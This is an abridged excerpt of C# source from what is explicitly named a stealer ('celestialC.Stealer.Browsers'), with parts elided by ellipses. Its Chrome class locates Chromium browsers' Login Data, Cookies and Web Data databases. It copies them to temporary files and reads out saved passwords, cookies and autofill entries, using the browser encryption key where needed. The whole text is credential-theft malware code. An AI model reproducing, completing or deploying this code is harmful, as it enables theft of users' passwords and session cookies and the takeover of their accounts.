...
namespace celestialC.Stealer.Browsers
{
    internal static class Chrome
    {
        ...
        private static string[] LBrowsersList = new string[]
        {
        ...
        private static string[] ABrowsersList = new string[]
        {
        ...
        internal static async Task<PasswordFormat[]> GetPasswords()
        {
            ...
            if (Directory.Exists(BrowserPath) && !(await GetEncryptionKey() is null))
            {
                string[] loginDataPaths = await Task.Run(() =>
                    Filemanager.GetFiles(BrowserPath, "Login Data"));

                foreach (string loginDataPath in loginDataPaths)
                    try
                    {
                    retry:
                        string tempLoginDataPath = Path.Combine(Path.GetTempPath(), random.Next(00000000, 99999999).ToString());
        ...
        internal static async Task<CookieFormat[]> GetCookies()
        {
            ...
            if (Directory.Exists(BrowserPath) && !(await GetEncryptionKey() is null))
            {
                string[] cookiesFilePaths = await Task.Run(() =>
                    Filemanager.GetFiles(BrowserPath, "Cookies"));

                foreach (string cookiesFilePath in cookiesFilePaths)
                    try
                    {
                    retry:
                        string tempCookiesFilePath = Path.Combine(Path.GetTempPath(), random.Next(00000000, 99999999).ToString());
        ...
        internal static async Task<AutoFillFormat[]> GetAutoFills()
        {
            var autofills = new List<AutoFillFormat>();

            if (Directory.Exists(BrowserPath))
            {
                string[] autofillFilePaths = await Task.Run(() =>
                    Filemanager.GetFiles(BrowserPath, "Web Data"));

                foreach (string autofillFilePath in autofillFilePaths)
                    try
                    {
                    retry:
                        string tempCookiesFilePath = Path.Combine(Path.GetTempPath(), random.Next(00000000, 99999999).ToString());
                        ...
                        File.Copy(autofillFilePath, tempCookiesFilePath);

                        SQLiteHandler handler = new SQLiteHandler(tempCookiesFilePath);

                        if (!handler.ReadTable("autofill"))
                            continue;
                        ...
                        for (int i = 0; i < handler.GetRowCount(); i++)
                        {
                            ...
                            if(!string.IsNullOrWhiteSpace(name) && !string.IsNullOrWhiteSpace(value))
                                autofills.Add(new AutoFillFormat(name, value));
                        }
